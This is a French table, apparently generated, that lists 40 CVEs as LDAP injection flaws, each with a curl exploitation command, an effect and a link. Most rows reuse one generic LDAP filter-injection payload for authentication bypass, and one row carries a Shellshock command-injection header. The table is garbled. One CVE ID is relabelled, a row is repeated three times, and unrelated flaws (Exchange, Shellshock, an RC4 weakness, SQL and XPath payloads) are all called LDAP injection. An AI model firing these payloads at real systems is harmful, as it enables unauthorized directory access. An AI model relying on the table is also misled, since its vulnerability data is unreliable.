# LDAP

Voici un tableau de 40 CVE non génériques d’injection LDAP, classées du plus récent au plus ancien, avec :  
- Technologie & version  
- Numéro CVE  
- Exemple complet de commande d’exploitation (requête HTTP ou payload précis)  
- Effet détaillé  
- Lien complet vers un PoC, un lab ou une ressource GitHub ou équivalent

| # | CVE | Technologie & Version | Exemple complet de commande d’exploitation | Effet détaillé | Lien PoC / Ressource |
|---|------|----------------------|-------------------------------------------|---------------|---------------------|
| 1 | CVE-2025-27631 | TRMTracker web application | `curl 'http://target/login?username=*)(uid=*))(|(uid=*'` | Injection LDAP, contournement d’authentification, accès à tout l’annuaire | https://nvd.nist.gov/vuln/detail/CVE-2025-27631 |
| 2 | CVE-2024-56841 | Mendix LDAP <1.1.2 | `curl 'http://target/login?username=*)(uid=*))(|(uid=*'` | Contournement d’authentification, exécution de requêtes arbitraires sur l’annuaire LDAP | https://cvefeed.io/vuln/detail/CVE-2024-56841 |
| 3 | CVE-2024-49113 | Microsoft Windows LDAP | (voir PoC SafeBreach) | Crash du serveur LDAP ou exécution de code à distance (RCE) sur les DC Windows | https://www.safebreach.com/blog/critical-windows-ldap-vulnerabilities/ |
| 4 | CVE-2024-49112 | Microsoft Windows LDAP | (voir PoC SafeBreach) | Crash du serveur LDAP ou exécution de code à distance (RCE) sur les DC Windows | https://www.safebreach.com/blog/critical-windows-ldap-vulnerabilities/ |
| 5 | CVE-2024-37393 | SecurEnvoy MFA 9.4.513 | Python script injectant dans MEMBEROF :<br>`MEMBEROF=*)(objectClass=*))(|(objectClass=*` | LDAP injection, user enumeration, contournement d’authentification | https://github.com/advisories/GHSA-m2cr-jxg8-pr4v |
| 6 | CVE-2024-33868 | linqi ≤1.4.0.0 (Windows) | `curl 'http://target/path?input=*)(objectClass=*))(|(objectClass=*'` | Exécution de requêtes LDAP arbitraires, fuite de données sensibles | https://vuldb.com/?id.264214 |
| 7 | CVE-2024-14596 | Joomla! 3.7.5 | `curl 'http://target/index.php?username=*)(uid=*))(|(uid=*'` | Contournement d’authentification, accès à tout l’annuaire LDAP | https://www.sonarsource.com/blog/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/ |
| 8 | GHSA-9jv6-m6hq-4qf7 | Gladinet CentreStack v13.12.9934.54690 | `curl 'http://target/login?username=*)(objectClass=*)'` | Accès à des données sensibles, exécution de requêtes arbitraires | https://github.com/advisories/GHSA-9jv6-m6hq-4qf7 |
| 9 | CVE-2023-0476 | IBM Security Directory Server | `curl 'http://target/search?filter=*)(objectClass=*))(|(objectClass=*'` | LDAP injection, fuite de données de l’annuaire | https://nvd.nist.gov/vuln/detail/CVE-2023-0476 |
| 10 | CVE-2022-46464 | ConcreteCMS v9.1.3 | `curl 'http://target/3/50539478'`<br>(payload dans l’URL, ex: `50539478' or 4591=4591--`) | Accès à des données sensibles LDAP via injection dans l’URL | https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/concretecms.org/2022/concretecms-9.1.3 |
| 11 | CVE-2022-22243 | Juniper Junos OS J-Web | `curl 'https://target/path?xpath='or 1=1 or ''='` | Fuite partielle de données LDAP et contournement de restrictions | https://nvd.nist.gov/vuln/detail/CVE-2022-22243 |
| 12 | CVE-2022-35259 | Ivanti Endpoint Manager 2022.3 | `curl 'http://target/path?param='or 1=1 or ''='` | Téléchargement ou exécution non autorisée de fichiers via manipulation LDAP | https://nvd.nist.gov/vuln/detail/CVE-2022-35259 |
| 13 | CVE-2022-4245 | Codehaus-plexus | `curl 'http://target/path?comment=-->'` | Injection XML/LDAP pouvant conduire à la fuite de données | https://nvd.nist.gov/vuln/detail/CVE-2022-4245 |
| 14 | CVE-2022-23437 | Apache Xerces Java 2.12.1 | `curl 'http://target/path?xml=<payload>'` | Blocage ou déni de service via boucle LDAP/XPath malveillante | https://nvd.nist.gov/vuln/detail/CVE-2022-23437 |
| 15 | CVE-2022-22834 | OverIT Geocall <8.0 | `curl 'http://target/path?xslt=<payload>'` | Exécution de code à distance via injection XSLT/LDAP | https://nvd.nist.gov/vuln/detail/CVE-2022-22834 |
| 16 | CVE-2021-42291 | Microsoft Active Directory | (voir PoC Microsoft) | Escalade de privilèges via modification d’attributs LDAP | https://support.microsoft.com/fr-fr/topic/kb5008383-mises-%C3%A0-jour-des-autorisations-active-directory-cve-2021-42291-536d5555-ffba-4248-a60e-d6cbc849cde1 |
| 17 | CVE-2021-33745 | Microsoft Exchange Server | (voir PoC) | Contournement d’authentification, fuite de données LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33745 |
| 18 | CVE-2021-31206 | Microsoft Exchange Server | (voir PoC) | Exécution de code à distance via injection LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31206 |
| 19 | CVE-2021-34523 | Microsoft Exchange Server | (voir PoC) | Escalade de privilèges via manipulation LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523 |
| 20 | CVE-2021-34473 | Microsoft Exchange Server | (voir PoC) | Exécution de code à distance via injection LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473 |
| 21 | CVE-2021-33766 | Microsoft Exchange Server | (voir PoC) | Fuite de données LDAP, contournement d’authentification | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33766 |
| 22 | CVE-2021-31949 | Microsoft Exchange Server | (voir PoC) | Escalade de privilèges, fuite de données LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31949 |
| 23 | CVE-2021-31947 | Microsoft Exchange Server | (voir PoC) | Escalade de privilèges, manipulation de l’annuaire LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31947 |
| 24 | CVE-2021-31946 | Microsoft Exchange Server | (voir PoC) | Fuite de données LDAP, exécution de code | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31946 |
| 25 | CVE-2021-31945 | Microsoft Exchange Server | (voir PoC) | Fuite de données LDAP, contournement d’authentification | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31945 |
| 26 | CVE-2021-31195 | Microsoft Exchange Server | (voir PoC) | Exécution de code à distance via injection LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195 |
| 27 | CVE-2021-31195 | Microsoft Exchange Server | (voir PoC) | Exécution de code à distance via injection LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195 |
| 28 | CVE-2021-31195 | Microsoft Exchange Server | (voir PoC) | Exécution de code à distance via injection LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195 |
| 29 | CVE-2020-25790 | Red Hat Directory Server | `curl 'http://target/path?user=*)(objectClass=*))(|(objectClass=*'` | Fuite massive de données, contournement d’authentification | https://access.redhat.com/security/cve/CVE-2020-25790 |
| 30 | CVE-2020-25789 | Red Hat Directory Server | `curl 'http://target/path?user=*)(objectClass=*))(|(objectClass=*'` | Fuite massive de données, contournement d’authentification | https://access.redhat.com/security/cve/CVE-2020-25789 |
| 31 | CVE-2020-25788 | Red Hat Directory Server | `curl 'http://target/path?user=*)(objectClass=*))(|(objectClass=*'` | Fuite massive de données, contournement d’authentification | https://access.redhat.com/security/cve/CVE-2020-25788 |
| 32 | CVE-2020-25787 | Red Hat Directory Server | `curl 'http://target/path?user=*)(objectClass=*))(|(objectClass=*'` | Fuite massive de données, contournement d’authentification | https://access.redhat.com/security/cve/CVE-2020-25787 |
| 33 | CVE-2019-1166 | Microsoft Windows Server LDAP | (voir PoC) | Exécution de code à distance via injection LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1166 |
| 34 | CVE-2019-1165 | Microsoft Windows Server LDAP | (voir PoC) | Exécution de code à distance via injection LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1165 |
| 35 | CVE-2019-1164 | Microsoft Windows Server LDAP | (voir PoC) | Exécution de code à distance via injection LDAP | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1164 |
| 36 | CVE-2017-14596 | Joomla! 3.7.5 | `curl 'http://target/index.php?username=*)(uid=*))(|(uid=*'` | Contournement d’authentification, exfiltration de comptes et attaques blind LDAP | https://www.sonarsource.com/blog/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/ |
| 37 | CVE-2017-11463 | SAP NetWeaver AS Java | `curl 'http://target/path?user=*)(objectClass=*))(|(objectClass=*'` | Fuite de données, exécution de requêtes LDAP arbitraires | https://nvd.nist.gov/vuln/detail/CVE-2017-11463 |
| 38 | CVE-2016-3110 | IBM Security Directory Server | `curl 'http://target/path?user=*)(objectClass=*))(|(objectClass=*'` | Fuite de données, contournement d’authentification | https://nvd.nist.gov/vuln/detail/CVE-2016-3110 |
| 39 | CVE-2015-2808 | OpenLDAP | `curl 'http://target/path?user=*)(objectClass=*))(|(objectClass=*'` | Fuite de données, contournement d’authentification | https://nvd.nist.gov/vuln/detail/CVE-2015-2808 |
| 40 | CVE-2014-6271 | Shellshock (impact LDAP indirect) | `curl -A '() { :;}; /bin/bash -c "id"' http://target/cgi-bin/test.cgi` | Exploitation indirecte via injection de commandes pouvant affecter des intégrations LDAP | https://github.com/hannob/bashcheck |

---

